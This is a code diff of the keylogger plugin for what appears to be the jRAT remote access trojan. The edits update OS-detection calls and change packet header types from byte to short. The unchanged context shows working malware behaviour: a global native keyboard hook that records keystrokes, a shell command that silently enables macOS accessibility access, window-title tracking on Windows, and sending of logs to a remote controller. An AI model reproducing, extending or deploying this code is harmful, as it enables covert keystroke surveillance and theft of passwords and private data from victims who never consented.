@@ -12,8 +12,6 @@ import java.io.PrintWriter;
 import java.util.ArrayList;
 import java.util.List;
 
-import jrat.api.stub.utils.OperatingSystem;
-
 import org.jnativehook.GlobalScreen;
 
 import se.jrat.plugin.keylogger.stub.activities.Activities;
@@ -23,15 +21,17 @@ import se.jrat.plugin.keylogger.stub.activities.Time;
 import se.jrat.plugin.keylogger.stub.activities.Title;
 import se.jrat.plugin.keylogger.stub.codec.Base64;
 
+import com.redpois0n.oslib.OperatingSystem;
+
 public class KeyloggerPlugin extends jrat.api.stub.StubPlugin {
 
 	public static DataInputStream dis;
 	public static DataOutputStream dos;
 	public static boolean enabled;
 
-	public static final byte STATUS_HEADER = 123;
-	public static final byte LOGS_HEADER = 124;
-	public static final byte LOG_HEADER = 125;
+	public static final short STATUS_HEADER = 123;
+	public static final short LOGS_HEADER = 124;
+	public static final short LOG_HEADER = 125;
 	
 	public void onEnable() throws Exception {
 
@@ -46,7 +46,7 @@ public class KeyloggerPlugin extends jrat.api.stub.StubPlugin {
 		KeyloggerPlugin.dos = out;
 	}
 
-	public void onPacket(byte header) throws Exception {
+	public void onPacket(short header) throws Exception {
 		if (header == STATUS_HEADER) {
 			dos.writeByte(STATUS_HEADER);
 
@@ -141,7 +141,7 @@ public class KeyloggerPlugin extends jrat.api.stub.StubPlugin {
 	@Override
 	public void onStart() throws Exception {
 		try {
-			if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
+			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
 				System.out.println("Trying to enable assistive devices... Even if enabled");
 				
 				Runtime.getRuntime().exec("touch /private/var/db/.AccessibilityAPIEnabled");
@@ -156,7 +156,7 @@ public class KeyloggerPlugin extends jrat.api.stub.StubPlugin {
 		GlobalScreen.registerNativeHook();
 		GlobalScreen.getInstance().addNativeKeyListener(new Keylogger());
 
-		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 			try {
 				new Thread(new TitleListener()).start();
 			} catch (Exception e) {
